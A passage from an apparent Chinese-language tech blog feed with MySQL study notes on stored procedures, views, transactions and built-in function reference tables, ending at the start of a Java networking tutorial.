title="8.1、存储过程"></a>8.1、存储过程</h5><ul><li><p>含义：一组预先编译好的SQL语句的集合，理解成皮处理语句</p><ul><li><p>1.提高代码重用性</p></li><li><p>2.简化操作</p></li><li><p>3.减少编译次数并且减少了和数据库服务器的连接次数，提高了效率</p></li></ul></li><li><p>二，创建语法</p><ul><li>create procedure 存储过程名(参数列表)</li><li>begin </li><li>存储过程体(一组合法的SQL语句)</li><li>end</li></ul></li><li><p>注意：</p><ul><li>1.参数列表包含三部分：参数模式，参数名，参数类型<ul><li>eg: in stuname varchar（20）</li></ul></li><li>2.参数类型：<ul><li>in:该参数可以作为输入，也就是说需要调用方传入值</li><li>out：该参数可以作为输出，可以作为返回值</li><li>inout：该参数既可以输入也可以作为输出，既需要传入值又需要返回值</li></ul></li><li>3.如果存储过程体仅仅只有一句话，begin end 可以省略</li><li>4.存储过程体中每条SQL语句结尾必须加分号，存储过程的结尾可以使用DELIMITER 重新设置</li><li>语法：DELIMITER 结束标记</li></ul></li><li><p>三，调用语法</p></li><li><p>call 存储过程名(实参列表);</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELIMITER $<br>CREATE PROCEDURE myp3()<br>BEGIN <br>  INSERT INTO xs_kc(学号,课程号,成绩,学分)<br>  VALUES(&#x27;18010221&#x27;,&#x27;103&#x27;,&#x27;95&#x27;,4),<br>​       (&#x27;18010222&#x27;,&#x27;113&#x27;,&#x27;100&#x27;,4),<br>​       (&#x27;18010223&#x27;,&#x27;134&#x27;,&#x27;55&#x27;,1),<br>​       (&#x27;18010224&#x27;,&#x27;145&#x27;,&#x27;64&#x27;,2),<br>​       (&#x27;18010225&#x27;,&#x27;161&#x27;,&#x27;73&#x27;,3),<br>​       (&#x27;18010226&#x27;,&#x27;111&#x27;,&#x27;86&#x27;,3),<br>​       (&#x27;18010227&#x27;,&#x27;161&#x27;,&#x27;91&#x27;,4);<br>END $<br><br>#调用存储过程<br>CALL myp3()$<br></code></pre></td></tr></table></figure><h4 id="9、视图"><a href="#9、视图" class="headerlink" title="9、视图"></a>9、视图</h4><blockquote><p>  定义：</p><p>  一种虚拟存在的表，行和列的数据来自定义视图的查询中使用的表，并且是在使用视图时动态生成的，只保存了SQL逻辑，不保存查询结果</p><p>  应用场景：</p><p>  1）多个地方用到相同的查询结果</p><p>  2）该查询结果使用SQL语句较复杂</p><p>  一，创建视图：</p><p>  语法：</p><pre><code class="hljs">create view 视图名as查询语句;</code></pre></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询姓名中包含a字符的员工名，部门名和工种信息<br>#1.创建视图<br>CREATE VIEW my_v1<br>AS<br>SELECT last_name,department_name,job_title<br>FROM employees e<br>JOIN departments d ON e.department_id = d.department_id<br>JOIN jobs j ON j.job_id = e.job_id;<br><br>#2.使用视图<br>SELECT *<br>FROM my_v1<br>WHERE last_name LIKE &#x27;%a%&#x27;;<br><br>#查询各部门的平均工资级别<br>CREATE VIEW my_v2<br>AS<br>SELECT AVG(salary) 平均工资,department_id<br>FROM employees<br>GROUP BY department_id;<br><br>SELECT my_v2.`平均工资`,g.grade_level<br>FROM my_v2<br>JOIN job_grades g<br>ON my_v2.`平均工资` BETWEEN g.lowest_sal AND g.highest_sal;<br><br>#查询平均工资最低的部门信息<br>SELECT *<br>FROM my_v2<br>ORDER BY 平均工资 LIMIT 1;<br><br>#查询平均工资最低的部门名和工资<br>CREATE VIEW my_v3<br>AS<br>SELECT *<br>FROM my_v2<br>ORDER BY 平均工资 LIMIT 1;<br><br>SELECT d.*,m.平均工资<br>FROM my_v3 m<br>JOIN departments d<br>ON m.`department_id` = d.`department_id`;<br><br>/**<br>视图的优点：<br>重用SQL语句<br>简化复杂的SQL操作，不必知道它的查询细节<br>保护数据，提高安全性<br>*/<br>#二，修改视图<br>/*<br>方式一：<br>    create or replace view 视图名<br>    as <br>    查询语句;<br>    <br>方式二：<br>    alter view 视图名<br>    as<br>    查询语句;<br>*/<br><br>#三，删除视图<br>/*<br>drop view 视图名,视图名,....;<br>*/<br><br>#四，查看视图(建议在命令行当中使用)<br>/*<br>方式一：<br>    desc 视图名;<br>方式二：<br>    show create view 视图名;<br>*/<br><br></code></pre></td></tr></table></figure><h4 id="10、TCL-事务控制语言"><a href="#10、TCL-事务控制语言" class="headerlink" title="10、TCL:事务控制语言"></a>10、TCL:事务控制语言</h4><ul><li><p>事务：</p><ul><li>一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行要么全部不执行。如果单元中的某条SQL语句执行失败或产生错误，整个单元将会回滚，所有受到影响的数据将返回到事务开始以前的状态；如果单元中的所有SQL语句均执行成功，则事务被顺利执行。</li></ul></li><li><p>存储引擎：</p><ul><li>1.在MySQL中的数据用各种不同的技术存储在文件或内存中</li><li>2.通过show engines 来查看mysql支持的存储引擎</li><li>3.在MySQL中用到最多的存储引擎有：innodb,myisam,memory等，其中innodb支持事务，而myisam,memory等不支持事务</li></ul></li><li><p>事务的ACID属性：</p><ul><li>1.原子性(Atomicity)<ul><li>是指事务是一个不可分割的工作单位，事务中的操作要么都发生要么都不发生</li></ul></li><li>2.一致性(Consistency)<ul><li>事务必须是数据库从一个一致性的状态变换到另一个一致性的状态</li></ul></li><li>3.隔离性(Isolation)<ul><li>是指一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能相互干扰。</li></ul></li><li>4.持久性(Durability)<ul><li>指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响</li></ul></li><li>事务的创建：<ul><li>隐式事务：事务没有明显的开启和结束的标记。如：insert，update语句。</li><li>显示事务：事务具有明显的开启和结束标记，前提必须先设置自动提交功能为禁用(set autocommit &#x3D; 0)</li></ul></li></ul></li><li><p>步骤：</p></li><li><p>1.开启事务</p></li><li><pre><code class="language-mysql">set autocommit = 0;start transaction;（可选的）</code></pre></li><li><p>2.编写事务中的SQL语句(select insert update delete)</p><ul><li>语句1;</li><li>语句2;</li><li>语句3;</li><li>…</li></ul></li><li><p>3.结束事务</p><ul><li>commit;提交事务</li><li>rollback;回滚事务</li><li>delete和truncate在事务使用时的区别</li><li>delete支持回滚，truncate不支持回滚</li></ul></li></ul><h4 id="11、错误解决方案"><a href="#11、错误解决方案" class="headerlink" title="11、错误解决方案"></a>11、错误解决方案</h4><p>MySQL错误：Can’t create table‘..’ （errno:150）解决方案</p><ul><li>(1)、检查sc表的外键字段的类型以及大小是否和s表c表完全一致</li><li>(2)、试图引用的其中一个外键没有建立起索引，或者不是一个primary key , 如果其中一个不是primary key 的放，你必须为它创建一个索引。</li><li>(3)、一个或两个表是MyISAM引擎的表，若想要使用外键约束，必须是InnoDB引擎</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL---基础01</title>
    <link href="/2020/06/04/MySQL---%E5%9F%BA%E7%A1%8001/"/>
    <url>/2020/06/04/MySQL---%E5%9F%BA%E7%A1%8001/</url>
    
    <content type="html"><![CDATA[<h3 id="一、MySQL数据库"><a href="#一、MySQL数据库" class="headerlink" title="一、MySQL数据库"></a>一、MySQL数据库</h3><h4 id="1、常见数据命令："><a href="#1、常见数据命令：" class="headerlink" title="1、常见数据命令："></a>1、常见数据命令：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select version(); #----查看数据库版本(或者：mysql -V)<br>show databases;   # -------查看当前所有数据库<br>use 库名  # ------打开指定库名<br>show tables from  库名; #-----------查看其他库的所有表<br>show          #----------查看当前数据库的所有表<br># 创建表<br>Create table 表名(<br>列名 列类型,<br>列名 列类型,<br>列名 列类型,<br>……..<br>列名 列类型<br>)<br>注意：结尾语句没有标点符号<br>#查看表结构<br>desc 表名;<br># 创建数据库<br>create database 创建数据库名称; <br><br></code></pre></td></tr></table></figure><h4 id="2、简单查询语句"><a href="#2、简单查询语句" class="headerlink" title="2、简单查询语句"></a>2、简单查询语句</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs mysql">/*<br>select 查询列表 from 表名;<br><br> 特点：<br>    1.查询列表可以是表中字段，常量值，表达式，函数<br>    2.查询的结果可以是一个虚拟的表格<br>*/<br><br>#1.查询表中单个字段<br>SELECT last_name FROM employees;<br><br>#2.查询表中多个字段<br>SELECT last_name,first_name,email,salary FROM employees;<br><br>#3.查询表中所有字段<br>SELECT * FROM employees;<br><br>#4.查询表中常量值<br>SELECT 600;<br><br>#5.查询表中函数<br>SELECT VERSION();<br><br>#6.查询表中表达式<br>SELECT 100 / 5;<br><br>#7.起别名<br>SELECT 100 % 98 AS 结果;<br>SELECT first_name AS 姓,last_name AS 名 FROM employees;<br><br>#8.去重。查询员工号表将多余的编号去掉<br># 注意：disinct出现在两个字段之前表示两个字段联合起来去重<br>SELECT DISTINCT department_id,salary<br>FROM employees;<br><br></code></pre></td></tr></table></figure><h4 id="3、常用函数"><a href="#3、常用函数" class="headerlink" title="3、常用函数"></a>3、常用函数</h4><h5 id="3-1、数学函数"><a href="#3-1、数学函数" class="headerlink" title="3.1、数学函数"></a>3.1、<strong>数学函数</strong></h5><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>ABS(x)</td><td>返回x的绝对值  SELECT ABS(-1) – 返回1</td></tr><tr><td>CEIL(x),CEILING(x)</td><td>返回大于或等于x的最小整数  SELECT CEIL(1.5) – 返回2</td></tr><tr><td>FLOOR(x)</td><td>返回小于或等于x的最大整数  SELECT FLOOR(1.5) – 返回1</td></tr><tr><td>RAND()</td><td>返回0-&gt;1的随机数  SELECT  RAND() –0.93099315644334</td></tr><tr><td>RAND(x)</td><td>返回0-&gt;1的随机数，x值相同时返回的随机数相同  SELECT  RAND(2) –1.5865798029924</td></tr><tr><td>SIGN(x)</td><td>返回x的符号，x是负数、0、正数分别返回-1、0和1  SELECT SIGN(-10) – (-1)</td></tr><tr><td>PI()</td><td>返回圆周率(3.141593）  SELECT PI() –3.141593</td></tr><tr><td>TRUNCATE(x,y)</td><td>返回数值x保留到小数点后y位的值（与ROUND最大的区别是不会进行四舍五入）  SELECT TRUNCATE(1.23456,3) – 1.234</td></tr><tr><td>ROUND(x)</td><td>返回离x最近的整数SELECT ROUND(1.23456) –1</td></tr><tr><td>ROUND(x,y)</td><td>保留x小数点后y位的值，但截断时要进行四舍五入  SELECT  ROUND(1.23456,3) – 1.235</td></tr><tr><td>POW(x,y).POWER(x,y)</td><td>返回x的y次方  SELECT POW(2,3) – 8</td></tr><tr><td>SQRT(x)</td><td>返回x的平方根  SELECT SQRT(25) – 5</td></tr><tr><td>EXP(x)</td><td>返回e的x次方  SELECT EXP(3) –  20.085536923188</td></tr><tr><td>MOD(x,y)</td><td>返回x除以y以后的余数  SELECT MOD(5,2) – 1</td></tr><tr><td>LOG(x)</td><td>返回自然对数(以e为底的对数)  SELECT LOG(20.085536923188) – 3</td></tr><tr><td>LOG10(x)</td><td>返回以10为底的对数  SELECT LOG10(100) – 2</td></tr><tr><td>RADIANS(x)</td><td>将角度转换为弧度  SELECT RADIANS(180) –  3.1415926535898</td></tr><tr><td>DEGREES(x)</td><td>将弧度转换为角度  SELECT  DEGREES(3.1415926535898) – 180</td></tr><tr><td>SIN(x)</td><td>求正弦值(参数是弧度)  SELECT SIN(RADIANS(30)) – 0.5</td></tr><tr><td>ASIN(x)</td><td>求反正弦值(参数是弧度)</td></tr><tr><td>COS(x)</td><td>求余弦值(参数是弧度)</td></tr><tr><td>ACOS(x)</td><td>求反余弦值(参数是弧度)</td></tr><tr><td>TAN(x)</td><td>求正切值(参数是弧度)</td></tr><tr><td>ATAN(x) ATAN2(x)</td><td>求反正切值(参数是弧度)</td></tr><tr><td>COT(x)</td><td>求余切值(参数是弧度)</td></tr></tbody></table><h5 id="3-2、字符串函数"><a href="#3-2、字符串函数" class="headerlink" title="3.2、字符串函数"></a>3.2、<strong>字符串函数</strong></h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>CHAR_LENGTH(s)</td><td>返回字符串s的字符数  SELECT CHAR_LENGTH(‘你好123’) – 5</td></tr><tr><td>LENGTH(s)</td><td>返回字符串s的长度  SELECT LENGTH(‘你好123’) – 9</td></tr><tr><td>CONCAT(s1,s2,…)</td><td>将字符串s1,s2等多个字符串合并为一个字符串  SELECT CONCAT(‘12’,’34’) –  1234</td></tr><tr><td>CONCAT_WS(x,s1,s2,…)</td><td>同CONCAT(s1,s2,…)函数，但是每个字符串直接要加上x  SELECT  CONCAT_WS(‘@’,’12’,’34’) – 12@34</td></tr><tr><td>INSERT(s1,x,len,s2)</td><td>将字符串s2替换s1的x位置开始长度为len的字符串  SELECT  INSERT(‘12345’,1,3,’abc’) – abc45</td></tr><tr><td>UPPER(s),UCAASE(S)</td><td>将字符串s的所有字母变成大写字母  SELECT UPPER(‘abc’) – ABC</td></tr><tr><td>LOWER(s),LCASE(s)</td><td>将字符串s的所有字母变成小写字母  SELECT LOWER(‘ABC’) – abc</td></tr><tr><td>LEFT(s,n)</td><td>返回字符串s的前n个字符  SELECT LEFT(‘abcde’,2) – ab</td></tr><tr><td>RIGHT(s,n)</td><td>返回字符串s的后n个字符  SELECT RIGHT(‘abcde’,2) – de</td></tr><tr><td>LPAD(s1,len,s2)</td><td>字符串s2来填充s1的开始处，使字符串长度达到len  SELECT LPAD(‘abc’,5,’xx’) –  xxabc</td></tr><tr><td>RPAD(s1,len,s2)</td><td>字符串s2来填充s1的结尾处，使字符串的长度达到len  SELECT RPAD(‘abc’,5,’xx’) –  abcxx</td></tr><tr><td>LTRIM(s)</td><td>去掉字符串s开始处的空格</td></tr><tr><td>RTRIM(s)</td><td>去掉字符串s结尾处的空格</td></tr><tr><td>TRIM(s)</td><td>去掉字符串s开始和结尾处的空格</td></tr><tr><td>TRIM(s1 FROM s)</td><td>去掉字符串s中开始处和结尾处的字符串s1  SELECT TRIM(‘@’ FROM  ‘@@abc@@’) – abc</td></tr><tr><td>REPEAT(s,n)</td><td>将字符串s重复n次  SELECT REPEAT(‘ab’,3) –  ababab</td></tr><tr><td>SPACE(n)</td><td>返回n个空格</td></tr><tr><td>REPLACE(s,s1,s2)</td><td>将字符串s2替代字符串s中的字符串s1  SELECT  REPLACE(‘abc’,’a’,’x’) –xbc</td></tr><tr><td>STRCMP(s1,s2)</td><td>比较字符串s1和s2</td></tr><tr><td>SUBSTRING(s,n,len)</td><td>获取从字符串s中的第n个位置开始长度为len的字符串</td></tr><tr><td>MID(s,n,len)</td><td>同SUBSTRING(s,n,len)</td></tr><tr><td>LOCATE(s1,s),POSITION(s1 IN s)</td><td>从字符串s中获取s1的开始位置  SELECT LOCATE(‘b’, ‘abc’) – 2</td></tr><tr><td>INSTR(s,s1)</td><td>从字符串s中获取s1的开始位置  SELECT INSTR(‘abc’,’b’) – 2</td></tr><tr><td>REVERSE(s)</td><td>将字符串s的顺序反过来  SELECT REVERSE(‘abc’) – cba</td></tr><tr><td>ELT(n,s1,s2,…)</td><td>返回第n个字符串  SELECT ELT(2,’a’,’b’,’c’) – b</td></tr><tr><td>EXPORT_SET(x,s1,s2)</td><td>返回一个字符串，在这里对于在“bits”中设定每一位，你得到一个“on”字符串，并且对于每个复位(reset)的位，你得到一个 “off”字符串。每个字符串用“separator”分隔(缺省“,”)，并且只有“bits”的“number_of_bits”  (缺省64)位被使用。  SELECT  EXPORT_SET(5,’Y’,’N’,’,’,4) – Y,N,Y,N</td></tr><tr><td>FIELD(s,s1,s2…)</td><td>返回第一个与字符串s匹配的字符串位置  SELECT FIELD(‘c’,’a’,’b’,’c’) – 3</td></tr><tr><td>FIND_IN_SET(s1,s2)</td><td>返回在字符串s2中与s1匹配的字符串的位置</td></tr><tr><td>MAKE_SET(x,s1,s2)</td><td>返回一个集合 (包含由“,”  字符分隔的子串组成的一个 字符串)，由相应的位在bits集合中的的字符串组成。str1对应于位0，str2对 应位1，等等。  SELECT  MAKE_SET(1|4,’a’,’b’,’c’); – a,c</td></tr><tr><td>SUBSTRING_INDEX</td><td>返回从字符串str的第count个出现的分隔符delim之后的子串。  如果count是正数，返回第count个字符左边的字符串。  如果count是负数，返回第(count的绝对值(从右边数))个字符右边的字符串。  SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,1)  – a  SELECT  SUBSTRING_INDEX(‘a<em>b’,’</em>‘,-1) – b  SELECT  SUBSTRING_INDEX(SUBSTRING_INDEX(‘a<em>b</em>c<em>d</em>e’,’<em>‘,3),’</em>‘,-1) – c</td></tr><tr><td>LOAD_FILE(file_name)</td><td>读入文件并且作为一个字符串返回文件内容。文件必须在服务器上，你必须指定到文件的完整路径名，而且你必须有file权 限。文件必须所有内容都是可读的并且小于max_allowed_packet。  如果文件不存在或由于上面原因之一不能被读出，函数返回NULL。</td></tr></tbody></table><h5 id="3-3、日期和时间函数"><a href="#3-3、日期和时间函数" class="headerlink" title="3.3、日期和时间函数"></a>3.3、<strong>日期和时间函数</strong></h5><table><thead><tr><th>函数</th><th align="center">说明</th></tr></thead><tbody><tr><td>CURDATE(),CURRENT_DATE()</td><td align="center">返回当前日期  SELECT CURDATE()  -&gt;2014-12-17</td></tr><tr><td>CURTIME(),CURRENT_TIME</td><td align="center">返回当前时间  SELECT CURTIME()  -&gt;15:59:02</td></tr><tr><td>NOW(),CURRENT_TIMESTAMP(),LOCALTIME(),  SYSDATE(),LOCALTIMESTAMP()</td><td align="center">返回当前日期和时间  SELECT NOW()  -&gt;2014-12-17 15:59:02</td></tr><tr><td>UNIX_TIMESTAMP()</td><td align="center">以UNIX时间戳的形式返回当前时间  SELECT UNIX_TIMESTAMP()  -&gt;1418803177</td></tr><tr><td>UNIX_TIMESTAMP(d)</td><td align="center">将时间d以UNIX时间戳的形式返回  SELECT UNIX_TIMESTAMP(‘2011-11-11  11:11:11’)  -&gt;1320981071</td></tr><tr><td>FROM_UNIXTIME(d)</td><td align="center">将UNIX时间戳的时间转换为普通格式的时间  SELECT FROM_UNIXTIME(1320981071)  -&gt;2011-11-11 11:11:11</td></tr><tr><td>UTC_DATE()</td><td align="center">返回UTC日期  SELECT UTC_DATE()  -&gt;2014-12-17</td></tr><tr><td>UTC_TIME()</td><td align="center">返回UTC时间  SELECT UTC_TIME()  -&gt;08:01:45 (慢了8小时)</td></tr><tr><td>MONTH(d)</td><td align="center">返回日期d中的月份值，1-&gt;12  SELECT MONTH(‘2011-11-11 11:11:11’)  -&gt;11</td></tr><tr><td>MONTHNAME(d)</td><td align="center">返回日期当中的月份名称，如Janyary  SELECT MONTHNAME(‘2011-11-11  11:11:11’)  -&gt;November</td></tr><tr><td>DAYNAME(d)</td><td align="center">返回日期d是星期几，如Monday,Tuesday  SELECT DAYNAME(‘2011-11-11  11:11:11’)  -&gt;Friday</td></tr><tr><td>DAYOFWEEK(d)</td><td align="center">日期d今天是星期几，1星期日，2星期一  SELECT DAYOFWEEK(‘2011-11-11  11:11:11’)  -&gt;6</td></tr><tr><td>WEEKDAY(d)</td><td align="center">日期d今天是星期几，   0表示星期一，1表示星期二</td></tr><tr><td>WEEK(d)，WEEKOFYEAR(d)</td><td align="center">计算日期d是本年的第几个星期，范围是0-&gt;53  SELECT WEEK(‘2011-11-11 11:11:11’)  -&gt;45</td></tr><tr><td>DAYOFYEAR(d)</td><td align="center">计算日期d是本年的第几天  SELECT DAYOFYEAR(‘2011-11-11  11:11:11’)  -&gt;315</td></tr><tr><td>DAYOFMONTH(d)</td><td align="center">计算日期d是本月的第几天  SELECT DAYOFMONTH(‘2011-11-11  11:11:11’)  -&gt;11</td></tr><tr><td>QUARTER(d)</td><td align="center">返回日期d是第几季节，返回1-&gt;4  SELECT QUARTER(‘2011-11-11  11:11:11’)  -&gt;4</td></tr><tr><td>HOUR(t)</td><td align="center">返回t中的小时值  SELECT HOUR(‘1:2:3’)  -&gt;1</td></tr><tr><td>MINUTE(t)</td><td align="center">返回t中的分钟值  SELECT MINUTE(‘1:2:3’)  -&gt;2</td></tr><tr><td>SECOND(t)</td><td align="center">返回t中的秒钟值  SELECT SECOND(‘1:2:3’)  -&gt;3</td></tr><tr><td>EXTRACT(type FROM d)</td><td align="center">从日期d中获取指定的值，type指定返回的值  SELECT EXTRACT(MINUTE FROM  ‘2011-11-11 11:11:11’)   -&gt;11  type可取值为：  MICROSECOND  SECOND  MINUTE  HOUR  DAY  WEEK  MONTH  QUARTER  YEAR  SECOND_MICROSECOND  MINUTE_MICROSECOND  MINUTE_SECOND  HOUR_MICROSECOND  HOUR_SECOND  HOUR_MINUTE  DAY_MICROSECOND  DAY_SECOND  DAY_MINUTE  DAY_HOUR  YEAR_MONTH</td></tr><tr><td>TIME_TO_SEC(t)</td><td align="center">将时间t转换为秒  SELECT TIME_TO_SEC(‘1:12:00’)  -&gt;4320</td></tr><tr><td>SEC_TO_TIME(s)</td><td align="center">将以秒为单位的时间s转换为时分秒的格式  SELECT SEC_TO_TIME(4320)  -&gt;01:12:00</td></tr><tr><td>TO_DAYS(d)</td><td align="center">计算日期d距离0000年1月1日的天数  SELECT TO_DAYS(‘0001-01-01  01:01:01’)  -&gt;366</td></tr><tr><td>FROM_DAYS(n)</td><td align="center">计算从0000年1月1日开始n天后的日期  SELECT FROM_DAYS(1111)  -&gt;0003-01-16</td></tr><tr><td>DATEDIFF(d1,d2)  Timestampdiff()根据指定值返回</td><td align="center">计算日期d1-&gt;d2之间相隔的天数  SELECT  DATEDIFF(‘2001-01-01’,’2001-02-02’)  -&gt;-32</td></tr><tr><td>ADDDATE(d,n)</td><td align="center">计算其实日期d加上n天的日期</td></tr><tr><td>ADDDATE(d，INTERVAL expr type)</td><td align="center">计算起始日期d加上一个时间段后的日期  SELECT ADDDATE(‘2011-11-11  11:11:11’,1)  -&gt;2011-11-12 11:11:11 (默认是天)  SELECT ADDDATE(‘2011-11-11  11:11:11’, INTERVAL 5 MINUTE)  -&gt;2011-11-11 11:16:11  (TYPE的取值与上面那个列出来的函数类似)</td></tr><tr><td>DATE_ADD(d,INTERVAL expr type)</td><td align="center">同上</td></tr><tr><td>SUBDATE(d,n)</td><td align="center">日期d减去n天后的日期  SELECT SUBDATE(‘2011-11-11  11:11:11’, 1)  -&gt;2011-11-10 11:11:11 (默认是天)</td></tr><tr><td>SUBDATE(d,INTERVAL expr type)</td><td align="center">日期d减去一个时间段后的日期  SELECT SUBDATE(‘2011-11-11  11:11:11’, INTERVAL 5 MINUTE)  -&gt;2011-11-11 11:06:11  (TYPE的取值与上面那个列出来的函数类似)</td></tr><tr><td>ADDTIME(t,n)</td><td align="center">时间t加上n秒的时间  SELECT ADDTIME(‘2011-11-11  11:11:11’, 5)  -&gt;2011-11-11 11:11:16 (秒)</td></tr><tr><td>SUBTIME(t,n)</td><td align="center">时间t减去n秒的时间  SELECT SUBTIME(‘2011-11-11  11:11:11’, 5)  -&gt;2011-11-11 11:11:06 (秒)</td></tr><tr><td>DATE_FORMAT(d,f)</td><td align="center">按表达式f的要求显示日期d  SELECT DATE_FORMAT(‘2011-11-11  11:11:11’,’%Y-%m-%d %r’)  -&gt;2011-11-11 11:11:11 AM</td></tr><tr><td>TIME_FORMAT(t,f)</td><td align="center">按表达式f的要求显示时间t  SELECT TIME_FORMAT(‘11:11:11’,’%r’)  11:11:11 AM</td></tr><tr><td>GET_FORMAT(type,s)</td><td align="center">获得国家地区时间格式函数  select get_format(date,’usa’)  -&gt;%m.%d.%Y (注意返回的就是这个奇怪  的字符串(format字符串))</td></tr><tr><td>LAST_DAY(date)</td><td align="center">返回当前日期的最后一天</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---简单网络编程</title>
    <link href="/2020/05/21/JavaSe%E5%9F%BA%E7%A1%80---%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/05/21/JavaSe%E5%9F%BA%E7%A1%80---%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a name="a4b14711"></a></p><h2 id="Java中的网络编程"><a href="#Java中的网络编程" class="headerlink" title="Java中的网络编程"></a>Java中的网络编程</h2><p><a name="90e6e30f"></a></p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1 - 概述"></a>1 - 概述</h3><p><a name="90cc8474"></a></p><h4 id="1-1-网络编程的三要素"><a href="#1-1-网络编程的三要素" class="headerlink" title="1.1 - 网络编程的三要素"></a>1.1 - 网络编程的三要素</h4><p>1、IP地址<br>2、端口<br>3、协议<br><a name="263dd7ad"></a></p><h4 id="1-2-IP地址"><a href="#1-2-IP地址" class="headerlink" title="1.2 - IP地址"></a>1.2 - IP地址</h4><blockquote><p>IP地址就是设备（电脑、手机、ipad、空调、冰箱）在网络中的唯一标识（通过IP地址访问的设备）</p></blockquote><ul><li>IP地址的两大分类 <ul><li>IPV4（主流的网络地址格式） </li><li>IPV6（未来10年够呛能普及）</li></ul></li><li>常用DOS命令 <ul><li>ipconfig -all (查看当前计算机网卡IP地址)</li><li>ping  xxx.xxx.xxx.xxx (测试网络是否畅通)</li><li>netstat -ano (查看本机端口占用情况)</li></ul></li><li>特殊的IP地址 <ul><li>127.0.0.1  - 本地的回环地址<br>  <a name="d97a1097"></a></li></ul></li></ul><h4 id="1-3-InetAddress"><a href="#1-3-InetAddress" class="headerlink" title="1.3 - InetAddress"></a>1.3 - InetAddress</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.UnknownHostException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> 